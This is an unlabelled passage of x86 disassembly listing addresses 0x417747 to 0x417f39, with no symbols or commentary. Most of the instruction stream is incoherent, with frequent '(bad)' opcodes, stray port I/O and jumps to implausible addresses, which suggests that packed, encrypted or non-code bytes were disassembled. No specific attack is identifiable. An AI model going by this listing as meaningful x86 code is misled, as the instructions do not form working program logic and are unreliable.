  417747:	stos   DWORD PTR es:[edi],eax
  417748:	jmp    0x40bee105
  41774d:	sahf   
  41774e:	sub    esp,ebp
  417750:	lods   eax,DWORD PTR ds:[esi]
  417751:	cmp    DWORD PTR [edi+ebx*4-0xd6aae3b],ebp
  417758:	out    dx,eax
  417759:	lahf   
  41775a:	aam    0x3e
  41775c:	addr16 dec edx
  41775e:	ins    DWORD PTR es:[edi],dx
  41775f:	jle    0x4177d9
  417761:	jmp    0x1588a38b
  417766:	inc    esi
  417767:	push   0x42
  417769:	ds push ds
  41776b:	xor    ecx,DWORD PTR [ebx+ebp*1-0x693d66e5]
  417772:	adc    al,0xb6
  417774:	test   eax,0xeb11da6e
  417779:	pop    ebx
  41777a:	pushf  
  41777b:	jne    0x4177dc
  41777d:	scas   eax,DWORD PTR es:[edi]
  41777e:	leave  
  41777f:	jne    0x41779f
  417781:	fs push es
  417783:	jb     0x417720
  417785:	mov    esi,0x8d2bcafa
  41778a:	xchg   ecx,eax
  41778b:	xor    eax,0xd6659dd3
  417790:	adc    BYTE PTR [esi+ecx*8],bh
  417793:	pop    eax
  417794:	jp     0x4177de
  417796:	lahf   
  417797:	xor    bl,BYTE PTR [esi]
  417799:	aad    0xe7
  41779b:	lea    edx,[edi]
  41779d:	sbb    al,0xf9
  41779f:	xor    dh,BYTE PTR [edi-0x455798ff]
  4177a5:	sbb    DWORD PTR [esi+0x34],0x4c9db87c
  4177ac:	mov    ecx,0x15401b94
  4177b1:	imul   esp,DWORD PTR [ebp-0x9fd4fa4],0x8fff004b
  4177bb:	jbe    0x417825
  4177bd:	mov    WORD PTR [ebx+0x79],cs
  4177c0:	les    ebp,FWORD PTR [eax+0x51]
  4177c3:	xchg   edi,eax
  4177c4:	and    ebp,DWORD PTR [ecx-0x478c0737]
  4177ca:	and    ebp,DWORD PTR [ecx-0x1047cfc5]
  4177d0:	popf   
  4177d1:	cmp    al,dh
  4177d3:	mov    cl,0x16
  4177d5:	or     eax,0x72e1afcf
  4177da:	out    0x31,al
  4177dc:	jo     0x41780b
  4177de:	outs   dx,DWORD PTR ds:[esi]
  4177df:	lods   al,BYTE PTR ds:[esi]
  4177e0:	(bad)  
  4177e1:	in     eax,dx
  4177e2:	stos   DWORD PTR es:[edi],eax
  4177e3:	dec    DWORD PTR cs:[eax]
  4177e6:	and    DWORD PTR [edi],0xffffff97
  4177e9:	jnp    0x417859
  4177eb:	inc    esi
  4177ec:	push   esp
  4177ed:	stos   BYTE PTR es:[edi],al
  4177ee:	add    DWORD PTR [esi+edx*8+0x44d61098],0x7c8b99ac
  4177f9:	pop    esp
  4177fa:	pop    ebx
  4177fb:	sbb    eax,DWORD PTR ds:0x4fc76a77
  417801:	loopne 0x41784d
  417803:	inc    ebx
  417804:	push   esi
  417805:	inc    ecx
  417806:	dec    ecx
  417807:	jns    0x417820
  417809:	mov    DWORD PTR [eax+0x27],edi
  41780c:	in     eax,0xb0
  41780e:	pop    ebp
  41780f:	cmp    al,0xcb
  417811:	jle    0x417883
  417813:	ins    DWORD PTR es:[edi],dx
  417814:	jp     0x417874
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
